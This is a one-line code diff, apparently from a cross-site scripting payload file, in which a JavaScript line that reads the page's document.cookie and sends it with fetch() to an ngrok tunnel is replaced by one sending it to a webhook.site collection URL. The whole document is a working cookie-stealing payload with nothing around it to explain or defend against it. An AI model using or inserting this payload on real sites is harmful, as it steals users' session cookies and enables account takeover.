@@ -1,1 +1,1 @@
-fetch("http://7.tcp.eu.ngrok.io:13817/?p="+document.cookie);
+fetch("https://webhook.site/c8278989-8630-4633-8ab8-2f8f2357bce7/?p="+document.cookie);
